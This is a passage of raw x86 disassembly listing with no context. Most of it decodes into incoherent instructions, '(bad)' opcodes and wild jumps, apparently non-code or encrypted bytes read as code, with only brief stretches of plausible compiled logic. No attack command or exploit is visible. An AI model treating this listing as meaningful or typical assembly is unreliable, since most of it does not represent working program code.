  40417d:	js     0x4041a7
  40417f:	mul    BYTE PTR [ebp+0xc114d1c]
  404185:	mov    edi,0xf0face24
  40418a:	in     al,0xe1
  40418c:	fidivr DWORD PTR [esi-0x13]
  40418f:	or     al,0x6d
  404191:	int    0x78
  404193:	mov    ebx,0x13520a91
  404198:	(bad)  
  404199:	mov    dh,0x7
  40419b:	or     bh,ah
  40419d:	sbb    al,0xdc
  40419f:	and    eax,0x6cafb549
  4041a4:	out    dx,al
  4041a5:	(bad)  
  4041a6:	sbb    DWORD PTR [ebp-0x1e97bbbb],ebp
  4041ac:	xchg   edi,eax
  4041ad:	or     eax,0xa2ae6c08
  4041b2:	push   ebp
  4041b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041b4:	xor    DWORD PTR [edi],esi
  4041b6:	adc    al,0x88
  4041b8:	in     al,dx
  4041b9:	push   esi
  4041ba:	add    BYTE PTR fs:[esi],0xb5
  4041be:	mov    esp,0x2cf0179f
  4041c3:	push   ds
  4041c4:	lock jo 0x4041c6
  4041c7:	mov    ds:0x738ab47a,al
  4041cc:	sbb    dl,dh
  4041ce:	aaa    
  4041cf:	mov    al,ds:0x1411ea79
  4041d4:	hlt    
  4041d5:	xor    BYTE PTR [ecx+0x4b],dl
  4041d8:	mov    dl,0x72
  4041da:	inc    edx
  4041db:	in     eax,dx
  4041dc:	leave  
  4041dd:	xchg   edx,eax
  4041de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041df:	test   DWORD PTR [eax-0x1ee8ef31],0x78f6741e
  4041e9:	enter  0x4c08,0x6
  4041ed:	lahf   
  4041ee:	and    al,0x4f
  4041f0:	jae    0x40422b
  4041f2:	pop    edi
  4041f3:	pop    es
  4041f4:	imul   edx,DWORD PTR [edx-0x71d75192],0x45b736f6
  4041fe:	scas   al,BYTE PTR es:[edi]
  4041ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404200:	popf   
  404201:	retf   
  404202:	int    0xbb
  404204:	or     ebx,DWORD PTR [esi]
  404206:	outs   dx,BYTE PTR ds:[esi]
  404207:	pop    esp
  404208:	inc    ebp
  404209:	pushf  
  40420a:	and    eax,0xb84c9985
  40420f:	loope  0x404213
  404211:	pop    ss
  404212:	push   eax
  404213:	imul   eax,DWORD PTR [edx],0x5f
  404216:	mov    es,ebx
  404218:	pop    eax
  404219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40421a:	int3   
  40421b:	into   
  40421c:	fstp   QWORD PTR [esi-0x61]
  40421f:	bound  esp,QWORD PTR [ebx+0x34]
  404222:	rcl    bl,cl
  404224:	mov    bh,0x29
  404226:	pop    esi
  404227:	rol    DWORD PTR [eax],0x6f
  40422a:	inc    ebp
  40422b:	scas   eax,DWORD PTR es:[edi]
  40422c:	xor    cl,dl
  40422e:	jecxz  0x40427c
  404230:	test   eax,0xc807f30b
  404235:	pop    es
  404236:	adc    eax,0xff30e99f
  40423b:	mov    ?,WORD PTR [edx-0x71dd5656]
  404241:	jae    0x4042a7
  404243:	inc    esp
  404244:	push   ebx
  404245:	ret    
  404246:	pop    edi
  404247:	and    bl,ah
  404249:	out    dx,al
  40424a:	sbb    eax,esp
  40424c:	mov    dh,0xf9
  40424e:	dec    esi
  40424f:	arpl   WORD PTR [esi+0x75],si
  404252:	(bad)  
  404253:	icebp  
  404254:	pushf  
  404255:	xor    eax,0xd4b85b90
  40425a:	scas   al,BYTE PTR es:[edi]
  40425b:	xchg   esp,eax
  40425c:	dec    ebp
  40425d:	jns    0x404205
  40425f:	xchg   BYTE PTR [ecx-0x12],al
  404262:	pop    ss
  404263:	(bad)  [eax+0x22]
  404266:	mov    DWORD PTR [edx+0x2c2c9ff6],edi
  40426c:	pop    eax
  40426d:	stc    
  40426e:	aam    0xc1
  404270:	mov    edx,0x9c680030
  404275:	or     esi,DWORD PTR ds:0xbdc35c1e
  40427b:	ds hlt 
  40427d:	sub    dh,al
  40427f:	add    al,0xb3
  404281:	mov    dl,0x1c
  404283:	mov    fs,WORD PTR [esi-0x4b]
  404286:	fimul  DWORD PTR [ecx-0x35757da0]
  40428c:	sub    bh,BYTE PTR [edi]
  40428e:	push   ebx
  40428f:	ret    
  404290:	cmp    eax,0x5fe682ef
  404295:	test   DWORD PTR [ecx+0x785ee662],edi
  40429b:	mov    ds:0xbd588485,eax
  4042a0:	ja     0x4042ed
  4042a2:	shl    BYTE PTR [ebx-0x4cd71da1],1
  4042a8:	add    ebp,DWORD PTR [ebx+0x3]
  4042ab:	in     al,0x3f
  4042ad:	xchg   esi,eax
  4042ae:	out    dx,al
  4042af:	out    0xb2,al
  4042b1:	mov    cs,WORD PTR [edx]
  4042b3:	inc    eax
  4042b4:	xor    eax,DWORD PTR [edi]
  4042b6:	pop    ebx
  4042b7:	mov    ds:0x114b50ac,eax
  4042bc:	sbb    al,0x5f
  4042be:	jge    0x404293
  4042c0:	int    0xe7
  4042c2:	mov    ch,0x8c
  4042c4:	inc    edx
  4042c5:	aad    0x9c
  4042c7:	mov    bh,0x49
  4042c9:	fcomp  DWORD PTR [edi+esi*8+0x4b7f974c]
  4042d0:	or     DWORD PTR ds:0xf0e01222,esi
  4042d6:	pop    edi
  4042d7:	jno    0x4042c3
  4042d9:	jno    0x4042de
  4042db:	jbe    0x40432b
  4042dd:	sub    al,0xb7
  4042df:	add    edi,esp
  4042e1:	and    bh,dh
  4042e3:	adc    al,0x5
  4042e5:	push   eax
  4042e6:	cli    
  4042e7:	push   esp
  4042e8:	das    
  4042e9:	mov    al,ds:0xcf13ddb2
  4042ee:	aaa    
  4042ef:	lods   eax,DWORD PTR ds:[esi]
  4042f0:	sbb    al,BYTE PTR [edi+ebp*2]
  4042f3:	das    
  4042f4:	cli    
  4042f5:	jno    0x404302
  4042f7:	bts    edi,edx
  4042fa:	les    esi,FWORD PTR [esi+0x17]
  4042fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4042fe:	(bad)  
  4042ff:	push   ds
  404300:	loop   0x404318
  404302:	int    0x8a
  404304:	adc    BYTE PTR [esi-0x7ecc3c09],dh
  40430a:	cwde   
  40430b:	jo     0x404326
  40430d:	in     al,dx
  40430e:	rol    BYTE PTR [ebx+0x3265c936],0x10
  404315:	cdq    
  404316:	mov    db2,esp
  404319:	inc    eax
  40431a:	jnp    0x404338
  40431c:	scas   eax,DWORD PTR es:[edi]
  40431d:	push   edi
  40431e:	mov    dl,0x52
  404320:	fadd   QWORD PTR [esi+0x13]
  404323:	inc    edx
  404324:	pop    edi
  404325:	sbb    ebp,DWORD PTR [eax+0x4df0fb7c]
  40432b:	ins    DWORD PTR es:[edi],dx
  40432c:	iret   
  40432d:	shr    ch,1
  40432f:	rcr    BYTE PTR [edx-0x75d44c45],1
  404335:	jne    0x404309
  404337:	imul   bp,WORD PTR [eax-0x70a09ad5],0xffaf
  40433f:	call   0xb2ff:0xf9730373
  404346:	lahf   
  404347:	dec    ebp
  404348:	bound  ecx,QWORD PTR [edi-0x78]
  40434b:	mov    esi,0x6b7b4128
  404350:	sbb    BYTE PTR [eax],dl
  404352:	push   edx
  404353:	mov    edi,0x8345cf25
  404358:	add    eax,0x1f770efd
  40435d:	ja     0x4042ef
  40435f:	data16 in al,0xe1
  404362:	(bad)  
  404363:	stc    
  404364:	retf   
  404365:	dec    ebp
  404366:	ins    BYTE PTR es:[edi],dx
  404367:	add    bh,BYTE PTR [ebp+0x5a]
  40436a:	imul   esi,DWORD PTR [edx+edi*1+0x1c6c4b11],0x5ba3ea23
  404375:	test   esi,eax
  404377:	shr    DWORD PTR [edi+0x43],cl
  40437a:	xchg   edi,eax
  40437b:	lods   al,BYTE PTR ds:[esi]
  40437c:	or     DWORD PTR [edx+0x78],ecx
  40437f:	aas    
  404380:	or     BYTE PTR [edi],dl
  404382:	mov    BYTE PTR ds:0x151cafb,al
  404388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404389:	in     al,dx
  40438a:	pop    edx
  40438b:	push   es
  40438c:	sar    DWORD PTR [ecx-0x4e],0x41
  404390:	mov    ebp,0x4333b847
  404395:	dec    eax
  404396:	push   0xffffff82
  404398:	dec    esp
  404399:	(bad)  
  40439a:	mov    eax,0x62602ba
  40439f:	sbb    edi,edi
  4043a1:	sbb    BYTE PTR [eax+0x5960ea56],cl
  4043a7:	fidivr DWORD PTR [esi+esi*4-0x278a9e97]
  4043ae:	push   ebp
  4043af:	adc    eax,0xdfa1409d
  4043b4:	fcomp  DWORD PTR [edx+0x6368b55]
  4043ba:	push   ds
  4043bb:	inc    eax
  4043bc:	add    al,0x1c
  4043be:	xchg   esi,eax
  4043bf:	lods   eax,DWORD PTR ds:[esi]
  4043c0:	mov    WORD PTR [edx-0x19ff59f],fs
  4043c6:	ss pusha 
  4043c8:	sti    
  4043c9:	and    al,0x7d
  4043cb:	int    0x99
  4043cd:	cmp    al,0x9f
  4043cf:	imul   esi,DWORD PTR [ecx-0x30],0xffffffbd
  4043d3:	and    BYTE PTR [edi-0x22],cl
  4043d6:	cld    
  4043d7:	lock retf 0x9bad
  4043db:	sbb    al,0x11
  4043dd:	(bad)  
  4043de:	mov    ds:0x8dfe56d9,al
  4043e3:	jp     0x404451
  4043e5:	jne    0x4043e6
  4043e7:	jl     0x4043a5
  4043e9:	dec    ecx
  4043ea:	push   es
  4043eb:	adc    ch,BYTE PTR [edx+0x7f797793]
  4043f1:	or     DWORD PTR [esp+ebp*8-0x58],edi
  4043f5:	push   ecx
  4043f6:	mov    eax,ds:0x221744af
  4043fb:	sub    eax,0xa30d7c24
  404400:	push   esi
  404401:	fs sub eax,0x5c7b69f4
  404407:	dec    edi
  404408:	std    
  404409:	mov    ebp,0xacfcf1af
  40440e:	ins    DWORD PTR es:[edi],dx
  40440f:	imul   esi,DWORD PTR [ebx+0x19d16e1d],0xfffffff7
  404416:	aam    0xdf
  404418:	adc    DWORD PTR [ebx-0x367a697a],edx
  40441e:	sub    eax,0xe1d9b8a8
  404423:	aaa    
  404424:	xor    DWORD PTR [ecx-0x7c90fcd1],ebp
  40442a:	out    0x9,al
  40442c:	xchg   ecx,eax
  40442d:	jge    0x4043cf
  40442f:	out    dx,eax
  404430:	mov    dl,0x9b
  404432:	fst    QWORD PTR [edx+ebp*1-0x14]
  404436:	cmp    DWORD PTR [edi-0x2e],ebx
  404439:	aad    0x37
  40443b:	jo     0x4043d5
  40443d:	push   edi
  40443e:	sub    ecx,DWORD PTR ds:[esi-0x4d]
  404442:	pop    es
  404443:	adc    al,0xe
  404445:	mov    WORD PTR [edx],ss
  404447:	dec    ecx
  404448:	outs   dx,DWORD PTR ds:[esi]
  404449:	loop   0x40445a
  40444b:	lds    edi,FWORD PTR [ebp+0x44eac40c]
  404451:	lea    eax,[eax]
  404453:	cmp    ebp,DWORD PTR [ebx-0x14]
  404456:	hlt    
  404457:	(bad)  
  404458:	lock inc esi
  40445a:	stc    
  40445b:	fsubp  st(0),st
  40445d:	call   0x2281:0x280a0d1e
  404464:	jne    0x404443
  404466:	xchg   esp,eax
  404467:	xor    eax,0x77524488
  40446c:	pop    ecx
  40446d:	jmp    0x577ce202
  404472:	rcr    BYTE PTR [esi-0x1a],1
  404475:	in     eax,0xea
  404477:	sbb    al,0xdd
  404479:	cmp    BYTE PTR [edi+0x7ca9c294],dh
  40447f:	ins    DWORD PTR es:[edi],dx
  404480:	inc    esi
  404481:	ret    
  404482:	sahf   
  404483:	xchg   DWORD PTR [eax+0x61e98053],esi
  404489:	stc    
  40448a:	ficomp DWORD PTR [ebx-0x3d]
  40448d:	rcr    DWORD PTR [edx+0xc],0xff
  404491:	mov    dl,0xb6
  404493:	or     BYTE PTR [edx+0x7ae53e19],ah
  404499:	cmp    eax,0xd3144417
  40449e:	push   ss
  40449f:	xor    eax,0x5f6482b4
  4044a4:	(bad)  
  4044a5:	in     al,0xd1
  4044a7:	jnp    0x7ea29524
  4044ad:	pusha  
  4044ae:	sbb    ebx,DWORD PTR [ebx]
  4044b0:	sti    
  4044b1:	jae    0x40450a
  4044b3:	adc    al,0x9e
  4044b5:	jae    0x404514
  4044b7:	test   eax,ecx
  4044b9:	clc    
  4044ba:	xor    DWORD PTR [ecx],esp
  4044bc:	fldenv [esi+0x79]
  4044bf:	mov    edi,0x7eb625f8
  4044c4:	sahf   
  4044c5:	dec    edi
  4044c6:	pop    esi
  4044c7:	pop    ss
  4044c8:	mov    al,0x76
  4044ca:	pop    ds
  4044cb:	(bad)  
  4044cd:	xor    eax,0x448a974f
  4044d2:	add    eax,0xff558aa8
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	pop    ds
  40450c:	in     eax,0x92
  40450e:	sahf   
  40450f:	jmp    0x404538
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x404540
  404518:	bound  ebx,QWORD PTR [edx+0x9]
  40451b:	jno    0x404554
  40451d:	push   ebp
  40451e:	sbb    ebx,DWORD PTR [ebx]
  404520:	sbb    ah,bh
  404522:	ret    
  404523:	sub    DWORD PTR [ebx],ebx
  404525:	push   es
  404526:	not    dh
  404528:	cs loope 0x4044f9
  40452b:	xor    eax,0x4c3054e9
  404530:	mov    ?,WORD PTR [eax]
  404532:	jo     0x40457d
  404534:	test   al,0x38
  404536:	mov    dh,0xc4
  404538:	(bad)  
  404539:	adc    al,0xb
  40453b:	mov    eax,0xd0ef7862
  404540:	aaa    
  404541:	mov    al,BYTE PTR [esi]
  404543:	add    BYTE PTR [ecx],ah
  404545:	stc    
  404546:	pop    edx
  404547:	popf   
  404548:	xchg   edi,eax
  404549:	jge    0x40458f
  40454b:	adc    ah,BYTE PTR [eax+ebx*8+0x54]
  40454f:	pop    edi
  404550:	add    eax,0x335180a7
  404555:	retf   
  404556:	inc    ebp
  404557:	xchg   esp,eax
  404558:	inc    edi
  404559:	mov    edi,0x3d59e7ae
  40455e:	xchg   ebx,eax
  40455f:	paddb  mm6,QWORD PTR [eax-0x76]
  404563:	stos   BYTE PTR es:[edi],al
  404564:	test   al,0x1e
  404566:	mov    al,ds:0xd8e502b
  40456b:	(bad)  
  40456c:	nop
  40456d:	stc    
  40456e:	push   esi
  40456f:	jnp    0x4044fa
  404571:	es pop edx
  404573:	lea    eax,[ebx+esi*8]
  404576:	adc    al,0x5d
  404578:	gs inc edi
  40457a:	std    
  40457b:	xchg   BYTE PTR [ecx],bh
  40457d:	fld    st(7)
  40457f:	dec    esi
  404580:	retf   
  404581:	aam    0x97
  404583:	loop   0x4045a9
  404585:	in     al,0x11
  404587:	xchg   ebp,eax
  404588:	push   ss
  404589:	ins    BYTE PTR es:[edi],dx
  40458a:	test   bl,0x13
  40458d:	pop    ss
  40458e:	lock frstor [ebp-0x3f73b550]
  404595:	or     al,BYTE PTR [ebp-0xb]
  404598:	bound  esp,QWORD PTR [ecx+0x3]
  40459b:	mov    BYTE PTR [edx+eiz*1],ah
  40459e:	js     0x40459b
  4045a0:	dec    ebp
  4045a1:	mov    cl,BYTE PTR [ebp+0x61]
  4045a4:	fistp  DWORD PTR [eax]
  4045a6:	sub    ecx,edx
  4045a8:	lds    eax,FWORD PTR [edx+0x57]
  4045ab:	dec    esi
  4045ac:	pop    ss
  4045ad:	jg     0x404606
  4045af:	(bad)  
  4045b0:	ficom  WORD PTR [ebx+edx*8+0x72]
  4045b4:	jle    0x40457a
  4045b6:	fadd   DWORD PTR [eax-0x35747e2a]
  4045bc:	(bad)  
  4045bd:	push   ecx
  4045be:	int3   
  4045bf:	jo     0x4045d2
  4045c1:	(bad)
  4045c6:	pop    edx
  4045c7:	mov    edx,0x3146a104
  4045cc:	inc    ebp
  4045cd:	dec    edx
  4045ce:	out    0xf2,al
  4045d0:	push   ds
  4045d1:	aas    
  4045d2:	mov    gs,WORD PTR [ebp-0x713bd8b4]
  4045d8:	rol    BYTE PTR [ecx+0x3c],0xfa
  4045dc:	sub    eax,0x29ececc6
  4045e1:	add    esp,edi
  4045e3:	cmp    eax,0xe724c0ec
  4045e8:	cdq    
  4045e9:	jne    0x40456f
  4045eb:	inc    edx
  4045ec:	jne    0x404619
  4045ee:	inc    edi
  4045ef:	mov    ch,0x63
  4045f1:	lock lods eax,DWORD PTR ds:[esi]
  4045f3:	mov    DWORD PTR [ebp-0x13],edx
  4045f6:	call   0x8486:0xe784da7c
  4045fd:	adc    edx,edi
  4045ff:	mov    es,WORD PTR [edx+0x19]
  404602:	dec    edi
  404603:	call   0xaa34:0xc8e06e69
  40460a:	jge    0x4045d4
  40460c:	sbb    cl,ch
  40460e:	pop    edi
  40460f:	ins    DWORD PTR es:[edi],dx
  404610:	jp     0x404662
  404612:	mov    ebp,ebp
  404614:	ins    DWORD PTR es:[edi],dx
  404615:	jge    0x4045f3
  404617:	fsub   DWORD PTR [ecx+0xe]
  40461a:	pop    ebp
  40461b:	adc    eax,0xf2174f6
  404620:	cmp    ecx,DWORD PTR [eax+eiz*2]
  404623:	mul    esi
  404625:	fisttp WORD PTR ds:0x790c5803
  40462b:	and    eax,0x2be4ae44
  404630:	dec    ebx
  404631:	mov    WORD PTR [ebx+0x31],ds
  404634:	pop    eax
  404635:	fist   WORD PTR [ecx]
  404637:	inc    edx
  404638:	repz scas al,BYTE PTR es:[edi]
  40463a:	or     eax,0x4d31de9a
  40463f:	jge    0x404693
  404641:	jae    0x4046b2
  404643:	mov    cl,0xdc
  404645:	cs scas al,BYTE PTR es:[edi]
  404647:	jp     0x404684
  404649:	iret   
  40464a:	pop    edi
  40464b:	in     eax,0xe0
  40464d:	call   0x4216:0xd87b5a9b
  404654:	pop    ebp
  404655:	jb     0x40469f
  404657:	dec    edx
  404658:	fmulp  st(5),st
  40465a:	(bad)  [eax+0x69]
  40465d:	and    eax,0x3a322444
  404662:	xchg   ebx,eax
  404663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404664:	bound  esp,QWORD PTR [edi]
  404666:	xor    DWORD PTR [eax+0x5b194735],ecx
  40466c:	inc    edi
  40466d:	ja     0x404618
  40466f:	sbb    ebp,DWORD PTR [edi]
  404671:	mov    ?,WORD PTR [esi-0x37655470]
  404677:	into   
  404678:	out    dx,al
  404679:	xor    esi,edi
  40467b:	xor    edi,DWORD PTR [eax+0x1f]
  40467e:	sti    
  40467f:	add    esp,DWORD PTR [eax+0x31471226]
  404685:	jmp    0x30f8b481
  40468a:	xor    dh,dh
  40468c:	aas    
  40468d:	mov    DWORD PTR [eax-0x76fd43a5],edi
  404693:	cmp    eax,DWORD PTR [edx+0x11]
  404696:	pop    ecx
  404697:	adc    al,0x38
  404699:	sub    DWORD PTR [edx-0x57],ebx
  40469c:	and    edi,edx
  40469e:	xchg   BYTE PTR [esi-0x3de443a9],bh
  4046a4:	mov    ch,0x4e
  4046a6:	scas   al,BYTE PTR es:[edi]
  4046a7:	aas    
  4046a8:	mov    bl,0x7d
  4046aa:	sbb    al,0xbf
  4046ac:	push   es
  4046ad:	xor    BYTE PTR [edi-0x1d8cec8b],dh
  4046b3:	and    esi,DWORD PTR [esi+0x3cc7ae6d]
  4046b9:	ret    0x96ee
  4046bc:	dec    ebp
  4046bd:	jge    0x404732
  4046bf:	jp     0x404716
  4046c1:	adc    BYTE PTR [edi+0x51],0x8d
  4046c5:	jbe    0x404740
  4046c7:	out    dx,al
  4046c8:	cld    
  4046c9:	mov    ecx,0xc89e99dd
  4046ce:	push   0x37
  4046d0:	shl    ecx,0xab
  4046d3:	ja     0x40470c
  4046d5:	fdiv   DWORD PTR [esi+0x2868d82f]
  4046db:	push   edx
  4046dc:	add    bl,BYTE PTR [esi+0x71]
  4046df:	neg    DWORD PTR [edi+0x7a71a81c]
  4046e5:	jle    0x40470e
  4046e7:	gs jecxz 0x4046fc
  4046ea:	or     DWORD PTR [ebx+ecx*2+0x733ec838],eax
  4046f1:	push   ebp
  4046f2:	call   0x933f1169
  4046f7:	sbb    esi,DWORD PTR [eax-0x1f]
  4046fa:	inc    ebp
  4046fb:	lods   al,BYTE PTR ds:[esi]
  4046fc:	outs   dx,DWORD PTR ds:[esi]
  4046fd:	inc    edi
  4046fe:	lock add eax,esi
  404701:	call   0x63d297d4
  404706:	mov    edi,0x9b5badc6
  40470b:	mov    ch,0x87
  40470d:	sahf   
  40470e:	pop    edi
  40470f:	test   DWORD PTR [esi-0x39],edx
  404712:	sti    
  404713:	add    edi,DWORD PTR [edi-0x5b67bbf9]
  404719:	and    edi,DWORD PTR [ecx]
  40471b:	or     edi,DWORD PTR [ecx+0x5bd82025]
  404721:	xor    DWORD PTR [eax+0x5761296a],ebx
  404727:	cmp    cl,dl
  404729:	push   edx
  40472a:	add    eax,0x32ceb5cd
  40472f:	loopne 0x404760
  404731:	mov    edi,0x9af14331
  404736:	and    DWORD PTR [edi-0x2f82be52],eax
  40473c:	mov    edi,0xc0965485
  404741:	xchg   edx,eax
  404742:	cli    
  404743:	ja     0x40473e
  404745:	pushf  
  404746:	adc    al,bl
  404748:	and    eax,0x983c8f5c
  40474d:	clc    
  40474e:	cmp    bh,ah
  404750:	cmp    ebp,DWORD PTR [edi+eax*1-0x333cc7a7]
  404757:	imul   edi,eax,0x60
  40475a:	xchg   ecx,eax
  40475b:	add    DWORD PTR [eax-0xc],0xffffffb7
  40475f:	xor    dl,BYTE PTR [edx+edi*8+0x724c1362]
  404766:	rol    BYTE PTR ds:0x155b6be7,0x81
  40476d:	iret   
  40476e:	inc    ebx
  40476f:	sahf   
  404770:	scas   eax,DWORD PTR es:[edi]
  404771:	(bad)  [esi+0x2f415299]
  404777:	fs dec esp
  404779:	mov    eax,eax
  40477b:	retf   
  40477c:	fs aaa 
  40477e:	xchg   ebx,eax
  40477f:	stos   DWORD PTR es:[edi],eax
  404780:	cwde   
  404781:	call   0x3f27:0xe22a1f2f
  404788:	sbb    ecx,DWORD PTR [ebp+eiz*2+0x63]
  40478c:	or     DWORD PTR [ebp+esi*1-0x7a],esi
  404790:	push   cs
  404791:	sbb    eax,0x3ba33e4f
  404796:	retf   0xf517
  404799:	xchg   ecx,eax
  40479a:	and    eax,0x3ac49278
  40479f:	inc    esi
  4047a0:	and    al,0xf3
  4047a2:	out    0x28,eax
  4047a4:	jl     0x404763
  4047a6:	repnz iret 
  4047a8:	int    0x1c
  4047aa:	jne    0x404745
  4047ac:	sbb    dl,BYTE PTR [ecx]
  4047ae:	jmp    0x40475b
  4047b0:	imul   esp,esi,0x583937e3
  4047b6:	and    eax,0x9b6d6eef
  4047bb:	xchg   DWORD PTR [eax+0x25215eea],edx
  4047c1:	stc    
  4047c2:	ins    BYTE PTR es:[edi],dx
  4047c3:	mov    bh,0x65
  4047c5:	mov    ds:0x7e12e021,eax
  4047ca:	xlat   BYTE PTR ds:[ebx]
  4047cb:	xchg   esp,eax
  4047cc:	adc    esi,eax
  4047ce:	mov    al,0x53
  4047d0:	mov    eax,ds:0xde8f2c86
  4047d5:	sub    DWORD PTR [esi+0x33],ebp
  4047d8:	fdivr  DWORD PTR [ebx-0x40875685]
  4047de:	fnstcw WORD PTR [ebp+0xbc738d3]
  4047e4:	loop   0x4047b9
  4047e6:	cmp    eax,0xdce91d3a
  4047eb:	jbe    0x404840
  4047ed:	je     0x40477c
  4047ef:	jp     0x404794
  4047f1:	push   esp
  4047f2:	es mov esp,0x4086db2d
  4047f8:	ins    BYTE PTR es:[edi],dx
  4047f9:	jne    0x40479a
  4047fb:	aad    0x2d
  4047fd:	out    0xb0,eax
  4047ff:	imul   cl
  404801:	sub    DWORD PTR [eax-0x4931618e],0x7279e859
  40480b:	pop    esp
  40480c:	cmp    eax,0xb50db21
  404811:	sbb    al,0xf0
  404813:	pop    eax
  404814:	gs stc 
  404816:	test   eax,0x8ae0db60
  40481b:	mov    ds,WORD PTR [ecx]
  40481d:	sbb    al,0x12
  40481f:	ins    BYTE PTR es:[edi],dx
  404820:	ret    
  404821:	and    eax,0x1e922337
  404826:	cmp    BYTE PTR [ebx+eiz*8],ah
  404829:	scas   eax,DWORD PTR es:[edi]
  40482a:	cmp    ah,bh
  40482c:	jno    0x40488d
  40482e:	(bad)  
  40482f:	jne    0x404887
  404831:	push   0xe
  404833:	bound  esp,QWORD PTR [ecx]
  404835:	lods   eax,DWORD PTR ds:[esi]
  404836:	jae    0x40486d
  404838:	push   esi
  404839:	mov    ah,0xa
  40483b:	idiv   DWORD PTR [ebp+0x7e]
  40483e:	aas    
  40483f:	jmp    0x7a01:0x80c8f886
  404846:	jb     0x404853
  404848:	js     0x4048a2
  40484a:	leave  
  40484b:	jmp    0xae04:0xf75b32a8
  404852:	adc    dh,dh
  404854:	xchg   ecx,eax
  404855:	and    eax,0x2ade78d3
  40485a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40485b:	mov    ch,0x2c
  40485d:	jno    0x40485f
  40485f:	into   
  404860:	pop    ecx
  404861:	and    BYTE PTR [edi-0x39],ch
  404864:	mov    cl,BYTE PTR [esi-0x3ced305d]
  40486a:	inc    esp
  40486b:	mov    edx,0xa17e6883
  404870:	pop    fs
  404872:	dec    edx
  404873:	mov    esp,0xeacdf3c3
  404878:	div    BYTE PTR [ecx]
  40487a:	push   esp
  40487b:	sub    eax,0x3df93e9d
  404880:	clc    
  404881:	sar    DWORD PTR [ecx+0x7c],1
  404884:	push   esi
  404885:	xchg   edx,eax
  404886:	loopne 0x4048d1
  404888:	or     bh,bh
  40488a:	outs   dx,BYTE PTR ds:[esi]
  40488b:	stc    
  40488c:	adc    ebx,DWORD PTR [eax]
  40488e:	inc    edx
  40488f:	xor    esi,esi
  404891:	push   esi
  404892:	add    edi,esp
  404894:	(bad)  
  404895:	sahf   
  404896:	jnp    0x4048f6
  404898:	test   eax,0xe2001219
  40489d:	aam    0x80
  40489f:	and    dl,BYTE PTR [eax+0x4479d772]
  4048a5:	iret   
  4048a6:	or     al,0xd5
  4048a8:	jle    0x40485c
  4048aa:	xchg   DWORD PTR [eax],ebx
  4048ac:	or     bh,BYTE PTR [ecx*8-0xdab6b1a]
  4048b3:	inc    esi
  4048b4:	xor    eax,0x3495acc8
  4048b9:	xor    esi,esi
  4048bb:	fwait
  4048bc:	addr16 sbb al,0x5d
  4048bf:	dec    eax
  4048c0:	jle    0x404892
  4048c2:	fstp   DWORD PTR [eax]
  4048c4:	jmp    0x40489a
  4048c6:	stos   DWORD PTR es:[edi],eax
  4048c7:	jl     0x40490d
  4048c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ca:	dec    esi
  4048cb:	mov    BYTE PTR [edi],cl
  4048cd:	dec    ecx
  4048ce:	stos   BYTE PTR es:[edi],al
  4048cf:	cmp    al,0x46
  4048d1:	pop    eax
  4048d2:	sbb    DWORD PTR [ebp+0x58c6a750],ecx
  4048d8:	shl    bh,1
  4048da:	jmp    0x4048c0
  4048dc:	out    0xda,eax
  4048de:	push   eax
  4048df:	dec    ebx
  4048e0:	mov    dh,0xf8
  4048e2:	cmp    DWORD PTR [eax-0x383954a6],0x32cebcfb
  4048ec:	leave  
  4048ed:	pop    esi
  4048ee:	int3   
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	out    0x1f,eax
  40491b:	scas   al,BYTE PTR es:[edi]
  40491c:	push   ebx
  40491d:	ret    
  40491e:	and    edi,DWORD PTR [esi+0x7e]
  404921:	push   esi
  404922:	jns    0x4049a2
  404924:	jle    0x40491c
  404926:	imul   edi,DWORD PTR [edx],0x8eab6854
  40492c:	adc    eax,0xaad72a3e
  404931:	aad    0x63
  404933:	jnp    0x4048d7
  404935:	loopne 0x40499b
  404937:	mov    esp,0x17dd0567
  40493c:	mov    bl,0x54
  40493e:	sbb    DWORD PTR [edx],ebp
  404940:	mov    DWORD PTR [ebx-0x36],ebp
  404943:	ret    
  404944:	leave  
  404945:	int3   
  404946:	neg    ch
  404948:	(bad)  
  404949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40494a:	loope  0x40494a
  40494c:	jnp    0x40496f
  40494e:	cmp    edx,DWORD PTR [ebp+0xe]
  404951:	add    al,0xe6
  404954:	xchg   ecx,eax
  404955:	ss aam 0xa
  404958:	or     ch,0x8b
  40495b:	sbb    ebx,DWORD PTR [edi+edx*2]
  40495e:	xchg   edx,eax
  40495f:	loope  0x4049a2
  404961:	popa   
  404962:	adc    DWORD PTR [ebp+0x19f06fe6],edi
  404968:	or     eax,0x50595392
  40496d:	mov    BYTE PTR [esp+esi*1],bh
  404970:	or     ebp,esp
  404972:	cdq    
  404973:	adc    ecx,DWORD PTR [ecx-0x80]
  404976:	aam    0xec
  404978:	pop    ss
  404979:	(bad)  
  40497a:	fucomip st,st(4)
  40497c:	lods   eax,DWORD PTR ds:[esi]
